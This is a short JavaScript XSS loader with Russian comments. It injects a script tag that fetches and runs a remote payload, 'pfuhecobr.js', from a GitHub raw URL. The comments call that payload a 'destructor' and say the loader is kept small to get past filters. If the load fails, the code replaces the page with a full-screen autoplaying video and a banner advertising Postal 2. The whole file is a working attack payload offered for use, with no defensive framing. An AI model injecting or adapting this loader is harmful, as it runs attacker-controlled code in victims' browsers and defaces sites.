// ==/=============================================================\==
// main.js - XSS ЗАГРУЗЧИК (BOOTSTRAPPER)
// Функция: Быстрая загрузка основного деструктора pfuhecobr.js
// Размер: Минимальный для обхода фильтров
// ==\=============================================================/==

(function() {
    // Супер-быстрый загрузчик
    var s = document.createElement('script');
    s.src = 'https://raw.githubusercontent.com/112312312313/testofxss/refs/heads/main/pfuhecobr.js';
    
    // Принудительная загрузка любым способом
    s.onload = function() { 
        // Если pfuhecobr.js загрузился, он сам все сделает
        console.log('+'); 
    };
    
    // Фолбэк если не загрузился
    s.onerror = function() {
        // Прямая вставка кода если не удалось загрузить
        document.body.innerHTML = '<iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1" style="width:100vw;height:100vh;position:fixed;top:0;left:0;border:none;"></iframe><div style="position:fixed;bottom:0;width:100%;background:yellow;font-size:50px;text-align:center;z-index:9999;">купить постал 2 &lt;-- купи постал :)</div>';
    };
    
    document.head.appendChild(s);
})();
